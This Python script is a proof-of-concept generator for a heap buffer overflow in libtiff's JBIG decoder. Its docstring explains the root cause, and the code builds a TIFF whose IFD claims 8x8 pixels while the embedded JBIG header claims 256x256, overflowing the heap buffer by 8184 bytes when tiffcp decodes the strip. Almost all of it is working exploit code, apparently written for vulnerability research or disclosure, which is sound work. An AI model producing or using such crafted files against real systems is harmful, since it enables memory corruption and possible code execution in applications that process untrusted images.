#!/usr/bin/env python3
"""
PoC generator for VULN-001: JBIGDecode ignores size parameter -> heap buffer overflow
File:  libtiff/libtiff/tif_jbig.c, JBIGDecode(), line 125
CWE:   CWE-122 (Heap-Based Buffer Overflow)

Root cause:
  Line 82:  (void) size, (void) s;   -- buffer capacity is discarded
  Line 125: _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder))
            buffer capacity = allocated from IFD dims (8x8 / 8 = 8 bytes)
            jbg_dec_getsize = from BIE header dims (256x256 / 8 = 8192 bytes)
            -> 8184-byte heap-buffer-overflow

Strategy:
  - TIFF IFD claims ImageWidth=8, ImageLength=8 (buffer alloc = 8 bytes)
  - Strip data contains a valid JBIG BIE whose header asserts X_D=256, Y_D=256
    so jbg_dec_getsize returns 8192 bytes
  - FillOrder=2 (FILLORDER_LSB2MSB) prevents JBIGDecode's TIFFReverseBits()
    call from scrambling the BIE header before jbg_dec_in sees it
  - Trigger: tiffcp -c none (TIFFReadEncodedStrip -> JBIGDecode -> overflow)
    Note: tiffsplit uses TIFFReadRawStrip which bypasses the codec entirely
"""

import struct
import os

OUTPUT_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif"
)

# ---------------------------------------------------------------------------
# Valid JBIG BIE for a 256x256 all-white bilevel image (1 plane, 1 stripe).
# BIH (20 bytes): DL=0 D=0 P=1 reserved=0 X_D=256 Y_D=256 L0=256
#                 Mx=0 My=0 order=0 options=0
# Followed by arithmetic-coded stripe data, then zero-padded to 1024 bytes
# so that TIFFroundup(StripByteCounts, 1024) == 1024, preventing any
# out-of-band garbage bytes from entering jbg_newlen's NEWLEN scan.
# ---------------------------------------------------------------------------
BIE_DATA = (
    b'\x00\x00\x01\x00'   # DL=0 D=0 P=1 reserved=0
    b'\x00\x00\x01\x00'   # X_D = 256 (big-endian)
    b'\x00\x00\x01\x00'   # Y_D = 256 (big-endian)
    b'\x00\x00\x01\x00'   # L0  = 256 (big-endian, single stripe)
    b'\x00\x00\x00\x00'   # Mx=0 My=0 order=0 options=0
    b'\x4b\xc8\xff\x02'   # arithmetic-coded stripe data (all-white, 256x256)
    + bytes(1000)          # zero-pad to 1024 bytes
)
assert len(BIE_DATA) == 1024

# Sanity: verify BIE header dimensions
assert struct.unpack(">I", BIE_DATA[4:8])[0]  == 256, "X_D mismatch"
assert struct.unpack(">I", BIE_DATA[8:12])[0] == 256, "Y_D mismatch"

# ---------------------------------------------------------------------------
# Build TIFF (little-endian):
#   Offset   0: header (8 bytes)
#   Offset   8: IFD (2 + 10*12 + 4 = 126 bytes)
#   Offset 134: JBIG BIE strip (1024 bytes)
# ---------------------------------------------------------------------------
IFD_WIDTH   = 8
IFD_HEIGHT  = 8
STRIP_OFFSET = 8 + 2 + 10 * 12 + 4   # = 134

TIFF_SHORT = 3
TIFF_LONG  = 4

# IFD entries in ascending tag order
ifd_entries = [
    (0x0100, TIFF_SHORT, 1, IFD_WIDTH),          # ImageWidth
    (0x0101, TIFF_SHORT, 1, IFD_HEIGHT),          # ImageLength
    (0x0102, TIFF_SHORT, 1, 1),                   # BitsPerSample = 1
    (0x0103, TIFF_SHORT, 1, 34661),               # Compression = JBIG (0x8765)
    (0x0106, TIFF_SHORT, 1, 1),                   # PhotometricInterpretation = BlackIsZero
    (0x010A, TIFF_SHORT, 1, 2),                   # FillOrder = FILLORDER_LSB2MSB (2)
    (0x0111, TIFF_LONG,  1, STRIP_OFFSET),        # StripOffsets
    (0x0115, TIFF_SHORT, 1, 1),                   # SamplesPerPixel
    (0x0116, TIFF_LONG,  1, IFD_HEIGHT),          # RowsPerStrip = 8
    (0x0117, TIFF_LONG,  1, len(BIE_DATA)),       # StripByteCounts = 1024
]

header = struct.pack("<2sHI", b"II", 42, 8)

ifd = struct.pack("<H", len(ifd_entries))
for tag, typ, cnt, val in ifd_entries:
    ifd += struct.pack("<HHI", tag, typ, cnt)
    if typ == TIFF_SHORT:
        ifd += struct.pack("<HH", val, 0)
    else:
        ifd += struct.pack("<I", val)
ifd += struct.pack("<I", 0)   # next IFD = 0

tiff_data = header + ifd + BIE_DATA
assert len(header) + len(ifd) == STRIP_OFFSET, "strip offset mismatch"

with open(OUTPUT_PATH, "wb") as f:
    f.write(tiff_data)

buf_alloc = (IFD_WIDTH * IFD_HEIGHT + 7) // 8    # 8 bytes
memcpy_sz = (256 * 256 + 7) // 8                  # 8192 bytes

print(f"[+] Written: {OUTPUT_PATH}  ({len(tiff_data)} bytes)")
print(f"    IFD dims  : {IFD_WIDTH}x{IFD_HEIGHT}  -> libtiff alloc = {buf_alloc} bytes")
print(f"    BIE dims  : 256x256      -> _TIFFmemcpy = {memcpy_sz} bytes")
print(f"    Overflow  : {memcpy_sz - buf_alloc} bytes past end of heap buffer")
